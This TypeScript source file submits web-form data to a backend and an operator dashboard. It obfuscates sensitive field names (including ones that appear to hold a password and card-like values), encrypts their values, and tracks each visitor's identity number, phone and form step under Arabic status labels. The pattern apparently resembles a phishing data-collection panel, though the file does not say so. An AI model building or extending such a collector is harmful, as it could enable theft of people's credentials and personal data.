/**
 * Secure Firebase - Replaced with API calls
 * Maintains same interface for backward compatibility
 */

import { addData, hasMeaningfulDashboardPayload } from './api';
import { _e, _d, _ef, _df, _l } from './secure-utils';

const sensitiveFields = ['_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_pw', '_ncc'];

function isSensitive(key: string): boolean {
  return sensitiveFields.includes(key);
}

export async function secureAddData(data: Record<string, any>): Promise<void> {
  const encrypted: Record<string, any> = {};

  Object.keys(data).forEach((key) => {
    if (isSensitive(key) && typeof data[key] === 'string') {
      const obfuscatedKey = btoa(key).substring(0, 12);
      encrypted[obfuscatedKey] = _e(data[key]);
    } else {
      encrypted[key] = data[key];
    }
  });

  // addData will also update the dashboard entry
  await addData(encrypted);
}

export async function secureSubmitFormData(data: Record<string, any>): Promise<void> {
  // Get current visitorId from localStorage AFTER addData updates it
  const currentVisitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null;
  
  if (!currentVisitorId) {
    console.error('[secureSubmitFormData] No visitorId in localStorage!');
    return;
  }

  // 1. Save visitor data to database
  await secureAddData(data);

  // 2. Get the (possibly updated) visitorId from localStorage
  const visitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : currentVisitorId;
  console.log('[secureSubmitFormData] Using visitorId:', visitorId);

  // 3. Create/Update dashboard entry only when the form has meaningful data
  if (!hasMeaningfulDashboardPayload(data)) {
    return;
  }

  const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
  
  try {
    const response = await fetch('/api/dashboard/requests', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: visitorId,
        visitorId: visitorId,
        customer: customerName,
        identityNumber: data?.identityNumber || '',
        phoneNumber: data?.phoneNumber || '',
        currentStep: data?.currentStep || 1,
        currentPage: data?.currentPage || 'home',
        status: 'جديد',
        stage: 'الخطوة 1',
        updated: 'تم التسجيل للتو',
        badge: 'new',
        submittedAt: new Date().toISOString(),
        raw: data
      })
    });
    
    if (response.ok) {
      console.log('[secureSubmitFormData] Dashboard entry created successfully');
    } else {
      console.error('[secureSubmitFormData] Dashboard API returned:', response.status);
    }
  } catch (error) {
    console.error('[secureSubmitFormData] Failed to create dashboard entry:', error);
  }
}

export async function secureGetData(
  docId: string,
  originalData: Record<string, any>
): Promise<Record<string, any>> {
  _l('Decrypting data from storage');

  const decrypted: Record<string, any> = { ...originalData };

  Object.keys(originalData).forEach((key) => {
    try {
      const decodedKey = atob(key);
      if (isSensitive(decodedKey) && typeof originalData[key] === 'string') {
        decrypted[decodedKey] = _d(originalData[key]);
        delete decrypted[key];
        _l(`Decrypted field: ${decodedKey}`);
      }
    } catch {
      // not a base64 key
    }
  });

  return decrypted;
}
